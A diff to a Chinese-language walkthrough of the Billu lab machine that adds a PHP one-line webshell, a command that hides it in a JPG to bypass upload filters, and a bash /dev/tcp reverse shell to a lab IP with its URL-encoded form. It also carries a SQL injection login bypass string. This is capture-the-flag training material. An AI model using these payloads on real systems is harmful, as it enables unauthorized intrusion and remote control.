@@ -136,12 +136,14 @@ $run = " select * from auth where pass='\' and uname=' or 1=1#' "
 |:--:|
 | Add Users |
 
-尝试直接上传一句话木马、修改扩展名的木马，都失败。审计代码发现做了扩展名、MagicNumber过滤。代码详见[./src/Billu-panel.php](./src/Billu-panel.php) 注释内容。那么可以考虑上传带有MagicNumber的木马。在cmd中用以下命令制作图片马。成功上传shell.png。
+尝试直接上传一句话木马、修改扩展名的木马，都失败。审计代码发现做了扩展名、MagicNumber过滤。代码详见[./src/Billu-panel.php](./src/Billu-panel.php) 注释内容。那么可以考虑上传带有MagicNumber的木马。在cmd中用以下命令制作图片马。成功上传shell.jpg。（为确保成功，可以使用页面上已存在的图片文件，保存到本地作为pic.jpg）。
 ```shell
 copy pic.jpg/b + muma.php/a shell.jpg
 ```  
-
-或者考虑在修改扩展名的木马加上MagicNumber，也能达到绕过的目的。
+```php
+// muma.php内容
+<?php system($_POST['cmd']) ?>
+```
 
 |![上传webshell](./images/Billu08-UploadShell.png)|
 |:--:|
@@ -153,11 +155,29 @@ copy pic.jpg/b + muma.php/a shell.jpg
 
 继续审计panel.php代码[./src/Billu-panel.php](./src/Billu-panel.php) ，发现除了Add、Show以外还有一个else分支。  
 
-在这个分支里，图片以包含形式显示，在php文件中会被当成代码执行。我们在Show Users里找到这站个图片，在新标签页显示这张图片，就可以得到图片的路径http://192.168.2.128/uploaded_images/shell.png。  
+在这个else分支里，'load'被包含，那么图片以包含形式显示，在php文件中会被当成代码执行。我们在Show Users里找到这站个图片，在新标签页显示这张图片，就可以得到图片的路径http://192.168.2.128/uploaded_images/shell.png。    
 
-然后访问这张图片。同时传入木马的参数。
+|![利用webshell](./images/Billu09-UseShell.png)|
+|:--:|
+| load替换为这张图片路径，同时传入木马的参数cmd。 |
 
-bash + nc
+接下来kali上运行nc。
+```shell
+nc -lvp 3333
+```  
+
+用Hack-Tools生成反弹shell，将cmd传入反弹shell，即可getshell。注意，反弹shell使用URL编码。
+
+```shell
+bash -c 'exec bash -i &>/dev/tcp/192.168.2.129/3333 <&1'
+```
+```url
+bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F192%2E168%2E2%2E129%2F3333%20%3C%261%27
+```
+
+|![反弹shell](./images/Billu10-ReverseShell.png)|
+|:--:|
+| 反弹shell |
 
 ## 提权
 
